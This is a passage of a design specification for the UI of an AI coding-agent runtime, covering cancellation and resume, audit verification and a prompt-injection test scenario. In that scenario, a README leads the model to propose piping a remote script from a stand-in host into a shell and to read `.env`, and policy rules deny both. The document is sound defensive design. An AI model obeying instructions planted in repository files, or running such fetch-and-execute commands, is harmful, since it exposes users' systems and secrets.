   Related pause (ID-16, CF-44): on an `internal` workspace, if `local/qwen-coder-32b` (T0) fails and only higher-tier models remain, fallback does not widen the tier on its own; the task waits (`waiting_for_input`, reason `provider`) and the card offers "Continue on anthropic/claude-sonnet (T3)", which calls `session.setPin {session_id, pin_model: "anthropic/claude-sonnet"}`. On `confidential` this action is never offered for T3 or T4.
6. **Demo proof.** The user submits T2 ("Fix the failing test in test/dates.test.ts"); the routing line reads "Chosen: company/qwen-coder-32b (T1) because prefer-internal; confidential data; 3 candidates" (or local T0), and the run completes (acceptance item 8).
7. **Loosening** (`confidential` → `internal`). The confirmation dialog (`classification.loosen.confirm.title`, `.body`, `.action`) states which tiers become admissible (T3 vendor APIs, T4 subscription harnesses), how many sessions are affected, and that running tasks keep their current model. Confirm calls `workspace.setClassification {classification: internal, confirm: true}`; without `confirm` the daemon returns `confirmation_required` (-32005) and the UI reopens the dialog. Event `workspace.classification {from: confidential, to: internal}`. Keep confidential closes the dialog with no call.

## F4. Cancellation and resume from last gate

```mermaid
flowchart TD
  K0["Run active: task implement running"] --> K1{"How cancel is triggered"}
  K1 -- "Mod+. or Cancel in header or status strip" --> K2
  K1 -- "warden cancel in CLI" --> K5
  K2["UI: session.cancel {session_id, task_id}<br/>(no task_id when waiting at a gate)<br/>card shows Stopping"] --> K3{"task.state cancelled within 5 s?"}
  K3 -- "error invalid_state" --> K4["Run already ended: refresh from events"]
  K3 -- "ok" --> K5["events: approval.resolved cancel for pending approvals,<br/>task.state to cancelled, sandbox.destroy killed_pids,<br/>artifact.created code-diff partial, worktree.checkpoint partial,<br/>workflow.end cancelled"]
  K3 -- "no, after 5 s" --> K6["cancel.stoppingSlow: still stopping<br/>after 10 s Banner: cancel not confirmed, Retry, Open Doctor"]
  K6 --> K5
  K5 --> ST5["ST-5: run group greyed, CancelledEntry<br/>View partial diff, ResumeBar"]
  ST5 --> D1{"Was G1 approved in this run?"}
  D1 -- "yes" --> R1["Resume from G1 enabled"]
  D1 -- "no, cancelled during plan or at G1" --> R2["resume.noGate<br/>Run request again: session.request same text"]
  R1 --> D2{"User action"}
  D2 -- "Resume from G1" --> D3{"ST-2 active?"}
  D3 -- "yes" --> R3["Disabled with reason sandbox missing"]
  D3 -- "no" --> R4["workflow.resume {run_id, from last_gate}<br/>returns new run_id"]
  R4 --> R5["Run 2 header: resumed from G1 of Run 1<br/>implement starts from gate-plan checkpoint"]
  D2 -- "View partial diff" --> R6["Context panel DiffViewer read-only, label Partial"]
  D2 -- "Leave" --> R7["Session stays cancelled, resumable later"]
```

Cancel is always reachable while a run is active (header button, run status strip, `Mod+.`, or `warden cancel`), and it needs no confirmation because nothing is lost: the partial diff and a checkpoint are kept and the run can be resumed from its last gate. The UI shows progress against the 5-second budget and never hides the control behind a dialog. After cancellation the run is greyed (ST-5); if the plan had been approved, "Resume from G1" starts a new run that reuses the approved plan and restarts `implement` from the G1 checkpoint (WRD-16 §15 item 10).

Narrative:

1. Trigger: `Mod+.`, the Cancel button in the `SessionHeader`, the Cancel link in the run status strip, or `warden cancel` in a terminal. If the run is waiting at a gate, Cancel cancels the run (same call).
2. UI calls `session.cancel {session_id, task_id}` for the task that is `running`, `waiting_for_approval` or `waiting_for_input`, or `session.cancel {session_id}` when the run waits at a gate with no active task (B05 §8.2). The Cancel control and the task header show "Stopping…" (`cancel.stopping`); the control is disabled to prevent double submission. Result `{cancelled_task_ids[], run_status}`.
3. Events in order (core §13.10): `approval.resolved {decision: cancel}` for any pending approval of that task (its card becomes "Cancelled"), `task.state implement running→cancelled {reason: cancelled}`, `sandbox.destroy {reason: cancelled, killed_pids}`, `artifact.created {type: code-diff, partial: true}`, `worktree.checkpoint {label: partial}`, `workflow.end {status: cancelled}`.
4. If `task.state →cancelled` has not arrived 5 s after the call, `cancel.stoppingSlow` appears ("Still stopping… processes are being force-stopped"); after 10 s a Banner "Cancel not confirmed" offers Retry cancel and Open Doctor (B05 §8.4). The cancelled state is never shown before the event.
5. ST-5: the run group is rendered in `color-state-cancelled`; the `CancelledEntry` reads "Cancelled by you at implement step 14 · partial diff kept" with View partial diff (`artifact.read` on the partial `code-diff`) and the killed process count.
6. `ResumeBar`: if `workflow.gate.resolved {gate_key: gate-plan, decision: approve}` exists in the run, "Resume from last gate" (`resume.action`) is enabled (disabled under ST-2 with the reason). Else it is disabled with `resume.noGate` and "Run request again" (`st.5.action.new`, `session.request` with the same text) is offered.
7. Resume calls `workflow.resume {run_id, from: "last_gate"}` → `{run_id: wfr_2, resumed_from}`. Events: `workflow.start {resumed_from: {run_id: wfr_1, gate_key: gate-plan}}`, `task.state implement →running`. The timeline adds "Run 2 · resumed from G1 of Run 1"; the approved plan is linked, not re-presented.
8. CLI-initiated cancel arrives only as events; the UI shows the same ST-5 without the local progress indicator. Daemon restart during a run shows `task.state →failed {reason: interrupted}`; if re-queued, the card shows "Interrupted by runtime restart; retrying (attempt 2 of 2)"; if not, the same `ResumeBar` is offered.

## F5. Security scenario S1 in `injection-lab`

```mermaid
flowchart TD
  I0["SCR-1: open injection-lab<br/>first-open default confidential, Open"] --> I1["Request: Set up the project following the README"]
  I1 --> I2["task plan: fs.read README.md allowed<br/>output shown with Untrusted label"]
  I2 --> I3["Model proposes proc.exec sh -c curl -s https://setup.example.net/x pipe sh"]
  I3 --> I4["policy.decision deny, R6<br/>rule platform.no-shell-strings"]
  I4 --> I5["ToolCallRow Denied, visible, no ApprovalCard,<br/>no tool.exec.start, model told why"]
  I5 --> I6{"Model next proposal"}
  I6 -- "fs.read .env" --> E1["policy.decision deny<br/>rule invariant.INV-1 secret deny-list"]
  E1 --> E2["ToolCallRow Denied: enforced at policy, executor, sandbox mount<br/>redaction count stays 0"]
  E2 --> I6
  I6 -- "proc.exec curl -s -o x.sh https://setup.example.net/x" --> P1["policy.decision approval_required<br/>user.other-commands, R3, scope_max task"]
  P1 --> P2["ApprovalCard command variant<br/>taint notice: instruction came from README.md"]
  P2 --> D1{"User decision"}
  D1 -- "Reject (R), demo path" --> P3["approval.resolved reject<br/>no process runs, model told"]
  D1 -- "Approve once" --> P4["curl runs in sandbox<br/>CONNECT setup.example.net:443"]
  P4 --> P5["policy.decision approval_required<br/>user.egress-other, R4, scope_max session"]
  P5 --> D2{"User decision within 120 s hold"}
  D2 -- "Reject or hold expires" --> P6["proxy.denied setup.example.net:443<br/>curl exits non-zero; row shows egress denied"]
  D2 -- "Approve" --> P7["proxy.connect, download into worktree only<br/>nothing executes outside the sandbox"]
  I6 -- "stops, writes plan" --> PL["G1 PlanCard notes the README instruction was refused"]
  P3 --> PL
  P6 --> PL
  P7 --> PL
  PL --> D3{"G1 decision"}
  D3 -- "Reject plan" --> AU["SCR-7 Audit or chain badge: Verify chain strict"]
  D3 -- "Approve" --> IM["implement continues under the same rules"] --> AU
  AU --> V1["audit.verify strict: chain ok, every tool.exec.start has an allow decision"]
```

S1 shows the runtime as the trust boundary from the user's side (H2). The README instruction to pipe a remote script into a shell is proposed by the model and denied by `platform.no-shell-strings` (CF-19) before anything runs: the timeline shows a red denied row with the rule id, and no approval prompt appears, because a denial needs no decision. An attempt to read `.env` is likewise denied by the secret deny-list (INV-1) without a prompt. A plain `curl` without a shell is an unknown command, so it asks for approval (R3, CF-19) and the card warns that the instruction came from untrusted repository content; the demo operator rejects it. If it were approved, the connection to the unlisted host would need its own egress approval and, if rejected, ends as `proxy.denied`. Finally `audit.verify --strict` proves every executed tool call had an allow decision.

Narrative:

1. The user opens `injection-lab` (default `confidential` accepted, F1.3) and submits "Set up the project following the README".
2. Plan task: `fs.read README.md` → `policy.decision allow (user.reads-in-worktree)` → `tool.exec.*`. Selecting the row shows the file content in the context panel under the `color-untrusted` label `toolcall.untrusted_output` (BI-4); the Context tab lists `context.assembled.sources[]` with `trust: untrusted` for README.md.
3. The model proposes `proc.exec {argv: ["sh","-c","curl -s https://setup.example.net/x | sh"]}`. Event `policy.decision {effect: deny, action.risk_class: R6, matched_rules: [platform.no-shell-strings], reason}`. No `approval.requested`, no `tool.exec.start`. The `ToolCallRow` deny variant is always visible (not collapsed): "Denied · sh -c "curl -s https://setup.example.net/x | sh" · platform.no-shell-strings". Details (`E` or select): reason `policy.reason.platform.no-shell-strings`, layer L1, "The model was told the call was denied."
4. The model proposes `fs.read .env`. Event `policy.decision {effect: deny, matched_rules: [invariant.INV-1]}`; the row reads "Denied · fs.read .env · invariant.INV-1"; details `policy.layers.INV-1` ("Blocked by policy. Also enforced by the executor path check and the sandbox mount."). No `redaction` event (nothing was read).
5. If the model proposes a plain `proc.exec ["curl","-s","-o","x.sh","https://setup.example.net/x"]`: `policy.decision {effect: approval_required, matched_rules: [user.other-commands], approval: {scope_max: task}}` and `approval.requested`. The `ApprovalCard` command variant (`approval.title.command`) shows the exact argv, R3, the rule reason, and `approval.taint.notice` when `display.taint_sources` includes README.md (ASM). Demo path: `R` → `approval.resolve {decision: reject}` → `approval.resolved {decision: reject}`; no process runs; the task returns to `running` and the model receives `approval_rejected`, so it continues or stops (ID-10).
6. Alternative branch (not the demo path): Approve once → `tool.exec.start` in the sandbox; the CONNECT to `setup.example.net:443` becomes `policy.decision {effect: approval_required, matched_rules: [user.egress-other]}` + `approval.requested` (egress variant `approval.title.egress`) while the proxy holds the connection up to 120 s; Reject or expiry → `proxy.denied {host: setup.example.net, port: 443, reason, held_ms}` shown as a denied egress sub-row, and the card stays open per core §13.4 until resolved.
7. The plan (if produced) appears at G1; the user rejects it. The timeline for the run lists every attempt with its decision; SCR-7 Audit `EventLog` filtered by "policy" shows the same list.
8. Verify chain (F6) with strict mode: `audit.verify {session_id, strict: true}` → `{ok: true, chain_ok: true, strict_ok: true}`; the badge shows "Chain verified · strict".

## F6. Audit verify and export

```mermaid
flowchart TD
  U0{"Entry point"} -- "SCR-7 Audit tab: pick session" --> U1
  U0 -- "Session header chain badge menu" --> U1
  U0 -- "Automatic: G2 presented, delivery done, session.close" --> U1
  U1["audit.verify {session_id, strict true}<br/>badge verifying"] --> D1{"result"}
  D1 -- "store_unavailable or not_found" --> U2["Error inline, badge unverified, Retry"]
  D1 -- "ok true" --> U3["Badge verified<br/>events count, strict ok, checkpoint ok"]
  D1 -- "ok false" --> ST6["ST-6 red Banner on session routes and Audit tab<br/>violations list: seq, kind, detail"]
  ST6 --> D2{"User action"}
  D2 -- "Open violation" --> U4["EventLog scrolled to seq via event.query"]
  D2 -- "Export anyway" --> W1["Warning dialog audit.export.warning_failed_chain"]
  W1 --> D3{"Confirm?"}
  D3 -- "no" --> ST6
  D3 -- "yes" --> X1
  U3 --> D4{"Export?"}
  D4 -- "no" --> DONE["Done"]
  D4 -- "yes" --> X0["Export dialog: include artifact contents (with_blobs)"]
  X0 --> X1["audit.export {session_id, with_blobs}"]
  X1 --> D5{"result"}
  D5 -- "error" --> X2["Inline error with CLI fallback command"]
  D5 -- "ok" --> X3["Show path, events, artifacts, sha256<br/>Reveal in file manager, Copy verify command"]
  X3 --> X4["Other machine: warden audit verify --file path --strict"]
```

The audit flow proves H2 and H5 from the desktop. Verification runs on demand and automatically when G2 is presented, after a delivery and at session close; the badge moves from unverified to verifying to verified. A failed verification is state ST-6: a red banner on every route of that session and a violation list linked into the event log. Export is always possible, but after a failed verification it requires confirming a warning. The export result shows the file path and its SHA-256 and gives the exact CLI command that re-verifies the file on another machine (acceptance item 5).

Narrative:

1. Entry points: the Audit tab of SCR-7 (session selector from `session.list`), the chain badge menu in the `SessionHeader` (Verify chain, Export audit…), or automatic triggers: `workflow.gate.presented {gate_key: gate-final}`, a successful `workflow.deliver`, and `session.close` (core §13.17).
2. UI calls `audit.verify {session_id, strict: true}`; the badge shows `chain.verifying`. Result `{ok, chain_ok, strict_ok, checkpoint_ok, events, violations[{seq, kind, detail}]}`.
3. `ok: true`: badge `chain.verified` with tooltip "1,284 events · strict: every tool call had an allow decision · checkpoint signature valid".
4. `ok: false`: ST-6. The red `Banner` (`state.chain_failed.title`, `.body`) appears on SCR-2 to SCR-5 of the session and on the Audit tab; the badge shows `chain.failed`. The violation list shows each `seq`, `kind` (for example `hash_mismatch`, `missing_allow_decision`, `checkpoint_signature`) and `detail`; selecting one calls `event.query {session_id, after_seq: seq - 5, limit: 10}` and highlights the event in the `EventLog`.
5. Export: dialog with "Include artifact contents" (`with_blobs`, off by default) and the default location `~/.warden/exports/`. After ST-6, the warning `audit.export.warning_failed_chain` must be confirmed first. UI calls `audit.export {session_id, with_blobs}` → `{path, events, artifacts, sha256}`.
6. Success panel `audit.export.done`: path (Reveal in file manager via the Tauri opener), SHA-256 with Copy, and the command `warden audit verify --file <path> --strict` with Copy.
7. Errors (`store_unavailable`, disk full) show inline with the equivalent CLI command `warden audit export --session <id>`.

## Traceability

| Design element | WRD source (doc §) | Requirement / invariant satisfied |
|---|---|---|
| F1.1 doctor before setup; ST-2 blocking, nav still reachable | WRD-11 §3; WRD-16 §3 step 1, §13 states | BI-2 (no unsandboxed fallback); WRD-11 §1.4 |
| F1.2 four setup paths with daemon-side tests | WRD-16 §6.1, §6.2, §13 screen 6; CF-36 | F-MD-2; H1 access modes |
| F1.2 secrets from masked field to `provider.add`, cert/key read by daemon | WRD-16 §10.5; WRD-02 §3 | BI-3 |
| F1.2 vendor-terms notice, acknowledgment, shared-mode lock | WRD-16 §6.1, §6.2 note; CF-21 | INV-7; core §13.15 |
| F1.2 harness pin-only notice | core §13.7 | F-MD-3 |
| F1.3 first-open classification default `confidential`, admissibility preview | WRD-01 F-WS-2; WRD-06 §2; CF-01, CF-02 | BI-7 |
| F2 routing line before work, plan before writes, approval before install, confirmation before delivery | WRD-11 §1.1, §2.2; WRD-16 §3 steps 3 to 6 | BI-1; F-MD-5 |
| F2 approval with scope workspace; second allow decision | WRD-08 §7; core §13.1, §13.5; CF-40 | BI-1; F-PL-3 |
| F2 repair round, G2 only after verify succeeded, failed variant | WRD-16 H4, §8; CF-24, CF-26 | H4 |
| F2 push approval scope fixed `once` | WRD-16 §9, §13 screen 5; WRD-08 §7 | R5 never persistable |
| F3 greyed vendor models with `tier_not_admitted`; task completes on T1 | WRD-16 §3 step 7, §6.3, §15 item 8 | BI-7; H1 |
| F3 loosening confirmation; mid-run pause | core §13.7, §13.14; WRD-06 §6 step 6 | BI-7; WRD-11 §1.1 |
| F4 cancel ≤ 5 s, partial artifacts, resume from G1 | WRD-16 §8, §15 item 10; WRD-11 §3; CF-38 | F-WS-4 |
| F5 shell string deny without prompt; `.env` deny; egress approval and `proxy.denied` | WRD-16 §4.3 S1, S2; CF-19, CF-20; core §13.4, §13.6 | BI-1, BI-4, BI-5; H2 |
| F6 verify strict, ST-6, export with sha256 and re-verify command | WRD-09 §4, §9; WRD-16 §11, §15 item 5 | H2, H5 |
| F2 gate outcomes, post-run delivery events, commit publishes the branch, push after commit or apply | core §15 ID-01, ID-02, ID-03 | BI-1 (each delivery passes the PDP) |
| F2 install approval preselects Workspace; rejected approvals return the task to running | core §15 ID-08, ID-10 | H6 |
| F3 ST-3 continuation and fallback pause via `session.setPin` | core §15 ID-04, ID-16; CF-44 | BI-7 |
| F2 verify-2 without a model call | core §15 ID-09 | H4 |

## Deviations and assumptions

- DEV: WRD-16 §4.3 S1 expects `deny` for the whole `curl … | sh` proposal; per CF-19 the shell-string form is denied by `platform.no-shell-strings`, while a plain `curl` argv reaches `user.other-commands` (approval). F5 shows both and uses Reject as the demo path.
- DEV: WRD-11 §3 names three setup paths; F1.2 has four (CF-36).
- Integration decisions applied (core §15): ID-01 (G1 reject and G2 discard cancel the run with reason `rejected`; Accept ends the run `succeeded`), ID-02 and ID-03 (post-run delivery with `workflow.delivered`, commit publishes `warden/<ulid>`, push after commit or apply), ID-04 and ID-16 (`session.setPin`, fallback pause), ID-08 (install approvals preselect Workspace), ID-09, ID-10, ID-13 (`provider.models {classification}`, `repository.remotes[]`), ID-15.
- ASM: the default `models.yaml` contains `ollama` and `lmstudio` entries (disabled) so `provider.test` can probe them before enablement (F1.2 path B); A11/A05 confirm.
- ASM: `provider.add` `secret_files {cert, key}` carries host file paths that the daemon reads; the webview never reads key material (F1.2 path C).
- ASM: Iterate at G2 records `workflow.resolveGate {approve, comment: "iterate"}` (run `succeeded`) before `session.request` (B05 §7.6, consistent with ID-01).
- ASM: `audit.verify` is also called by the UI when G2 is presented (in addition to the core §13.17 triggers), so the chain status is visible at the gate as WRD-16 §3 step 6 shows it.
- ASM: `audit.verify` violation `kind` values `hash_mismatch`, `missing_allow_decision`, `checkpoint_signature` (A04/A05 define the enum).
- ASM: `approval.requested.display.taint_sources[]` for the taint notice (F5 step 5).
- ASM: first open emits `workspace.classification {from: null}` on the system chain (A04).
- OQ-candidate: S1 egress denial without prompt. Recommended answer: keep `user.egress-other` as approval in the PoC (the demo rejects); do not add a taint-based auto-deny rule until the MVP taint model exists.
